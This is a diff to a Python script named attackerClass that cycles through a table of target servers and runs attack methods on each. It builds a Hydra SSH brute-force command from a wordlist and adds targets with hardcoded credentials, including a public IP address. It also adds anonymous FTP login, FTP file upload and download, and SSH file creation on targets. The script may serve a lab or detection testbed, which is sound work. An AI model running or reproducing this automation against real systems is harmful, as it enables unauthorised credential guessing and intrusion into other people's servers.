@@ -7,7 +7,7 @@ import logging as log
 import inspect
 import json
 
-log.basicConfig()
+log.basicConfig(filename='attacker.log',level=log.DEBUG)
 
 class attackerClass(object):
 
@@ -37,6 +37,7 @@ class attackerClass(object):
 		Compares current value to next value inside the items
 		If ip and service and method are the same nothing is executed
 		Else call_class_method is executed
+		If method is repeating it will only be executed once
 		'''
 		try: 
 			for key, val in service_array.items():
@@ -52,13 +53,17 @@ class attackerClass(object):
 					next_service = service_array[nextElement][0]["Service"]
 					
 					if current_ip == next_ip and current_service == next_service and current_method == next_method:
-						print("Repeating Method: {} On Server: {} ".format(current_method,current_ip))
+						print("Repeating Method: {} On Server: {} Service: {} \n".format(current_method,current_ip,current_service))
 						break
 					elif current_ip == next_ip and current_service == next_service and current_method != next_method:
-						print("Executing: {} On Server: {} \n".format(current_method,current_ip))
+						print("Executing: {} On Server: {}  Service: {} \n".format(current_method,current_ip,current_service))
 						attackerClass.call_class_method(current_method,current_ip,current_user,current_pass)
-						break			
-								
+						break
+					elif current_ip != next_ip and current_service != next_service and current_method != next_method:
+						print("Executing: {} On Server: {}  Service: {} \n".format(current_method,current_ip,current_service))
+						attackerClass.call_class_method(current_method,current_ip,current_user,current_pass)
+						break
+											
 		except Exception as e:
 			print (str(e))
 			log.exception(e)
@@ -86,9 +91,12 @@ class attackerClass(object):
 		If username and password found kill hydra 
 		Execute collect data method
 		'''
+		
+		ip = args["IP"]
+		
 		try:
 			print("Hydra BruteForce Being Executed")
-			command = "hydra -L /home/ubuntu/Documents/usernames.txt -P /home/ubuntu/Documents/usernames.txt {} ssh".format(args)	
+			command = "hydra -L /home/ubuntu/Documents/usernames.txt -P /home/ubuntu/Documents/usernames.txt {} ssh".format(ip)	
 			child = pexpect.spawn(command)	
 			time.sleep(30)
 			print("BruteForce Successfully Executed")
@@ -298,14 +306,12 @@ class attackerClass(object):
 				ssh_handle.sendline("exit")
 				ssh_handle.expect("$")
 				ssh_handle.sendline("exit")
-				#ssh_handle.logout()
 
 				print("SSH Login Succesful ")
 
 			if index == 1:
 				ssh_handle.expect("$")
 				ssh_handle.sendline("exit")
-				#ssh_handle.logout()
 
 				print("SSH Login Succesful ")
 
@@ -460,41 +466,61 @@ if __name__ == "__main__":
 	object = attackerClass()
 	the_array = {
 	0: [{
-		"Service": "SSH",
-		"IP": "10.0.5.37",
-		"User": "ubuntu",
-		"Password": "ubuntu",
-		"Method": "execute_ssh_create_file"
+		"Service": "FTP",
+		"IP": "146.64.182.213",
+		"User": "ftpserver1",
+		"Password": "ftpserver1",
+		"Method": "hydra_spawn"
 	}],
 	1: [{
 		"Service": "SSH",
 		"IP": "10.0.5.37",
 		"User": "ubuntu",
 		"Password": "ubuntu",
-		"Method": "execute_ssh_create_file"
+		"Method": "hydra_spawn"
 	}],
 	2: [{
-		"Service": "SSH",
-		"IP": "10.0.5.37",
-		"User": "ubuntu",
-		"Password": "ubuntu",
-		"Method": "execute_ssh_sudo"
+		"Service": "FTP",
+		"IP": "146.64.182.213",
+		"User": "ftpserver1",
+		"Password": "ftpserver1",
+		"Method": "execute_ftp_put_user_file"
 	}],
 	3: [{
-		"Service": "SSH",
-		"IP": "10.0.5.37",
-		"User": "ubuntu",
-		"Password": "ubuntu",
-		"Method": "execute_ssh_login"
+		"Service": "FTP",
+		"IP": "146.64.182.213",
+		"User": "ftp",
+		"Password": "ftp",
+		"Method": "execute_ftp_login_anon_user"
 	}],
 	4: [{
 		"Service": "SSH",
 		"IP": "10.0.5.37",
 		"User": "ubuntu",
 		"Password": "ubuntu",
+		"Method": "execute_ssh_login"
+	}],
+	5: [{
+		"Service": "SSH",
+		"IP": "10.0.5.37",
+		"User": "ubuntu",
+		"Password": "ubuntu",
 		"Method": "execute_ssh_create_file"
+	}],
+	6: [{
+		"Service": "SSH",
+		"IP": "10.0.5.37",
+		"User": "ubuntu",
+		"Password": "ubuntu",
+		"Method": "execute_ssh_create_file"
+	}],
+	7: [{
+		"Service": "FTP",
+		"IP": "146.64.182.213",
+		"User": "ftpserver1",
+		"Password": "ftpserver1",
+		"Method": "execute_ftp_get_user_file"
 	}]
-	
 }
 	
 	object.generate_random_request(the_array)
